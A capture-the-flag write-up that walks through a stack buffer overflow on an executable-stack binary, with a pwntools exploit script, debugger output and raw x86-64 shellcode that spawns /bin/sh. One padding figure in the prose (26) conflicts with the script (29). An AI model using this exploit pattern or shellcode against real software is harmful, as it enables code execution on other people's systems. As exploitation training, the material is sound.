When we run the program we're given the output `Oops! I leaked some stuff 0x7ffe978e4df0` and a prompt. The first thing we do is open it up in Ghidra to see if we can find something interesting. Apparently `main()` only calls the function `vuln()`, which will be of interest to us. The decompiled version is:

```c
void vuln(void)

{
  undefined local_38 [48];
  
  printf("Oops! I leaked some stuff %p\n> ",local_38);
  read(0,local_38,64);
  return;
}
```

So the function creates an array 48 bytes in length, prints that array, and uses the `read()` function to read 64 bytes into this array, and then it just returns. So what do we do with this? The challenge text heavily hinted at getting a shell, so we're going to have to try doing that. But how?

Lets use checksec to find out what protections the file has (or hasn't):
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

Importantly for us the `Stack` and `NX` protections are turned off. This means that we can do a buffer overflow, and execute code on the stack. This in turn means that, if we are able to write code on the stack we can write code which executes `/bin/sh`. 

# overflowing the buffer and returning to the start of the array
If we run `cyclic` we can overflow the buffer and find the offset at 56. if we look at this in pwngdb see that we also overwrite the return pointer. Now what we want to do is place the address to the start of the leaked array into the return pointer.

We do this with (here I have removed parsing the address and some other initial stuff):
```python
padding = b"A" * 48 + b"B" * 8
packed_addr = p64(addr)

rop = ROP(binary)

rop.raw(padding)
rop.raw(packed_addr)

p.sendlineafter(b"> ", rop.chain())
p.interactive()
```

This yields (from the script):
```python
[DEBUG] Received 0x2b bytes:
    b'Oops! I leaked some stuff 0x7ffe805dae60\n'
    b'> '
[*] Loaded 14 cached gadgets for './first_pwn'
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  42 42 42 42  42 42 42 42  60 ae 5d 80  fe 7f 00 00  │BBBB│BBBB│`·]·│····│
    00000040  0a                                                  │·│
    00000041
```
And in the program:
```python
0x5616d0e3120c <vuln+60>    ret    <0x7ffe805dae60>
```

Success! We have managed to return to the start of the array. But that alone is not enough, now we will need to inject code into the stack and execute this to get a shell

# Getting a shell
For this next part I just found some shellcode online, but unfortunately I have lost the source, so I can't link back to it. Regardless, the shellcode is: `\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`

Therefore we add the following to our python solve script:
```python
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = shellcode + 29 * b"A"
---
rop.raw(payload)
rop.raw(packed_addr)

p.sendlineafter(b"> ", rop.chain())
```
What this does is add the shellcode to the start of the array and a padding **up until** the place we got a buffer overflow before (i.e. 56 which we discovered earlier with `cyclic`). also note `26 = (56 - len(shellcode))`. The extra A's are required because we want to overwrite the return pointer (which we saw earlier) and place our own code there.

When we now return to the start of the array, what we placed there earlier (the shellcode) will execute and we get a shell. 

# lessons
Some useful gbd commands:
`b *vuln+48` -> break at offset from function

Useful workflow:
add `pause()` to pwntools script before exploit. Stop execution of script and gives a pid, attach to the process with pwn-gdb with `gdb -p <PID>` to see what's going on.

This was my first shellcode pwn challenge, so I also learned tons about how to exploit enabled stack execution to get a shell.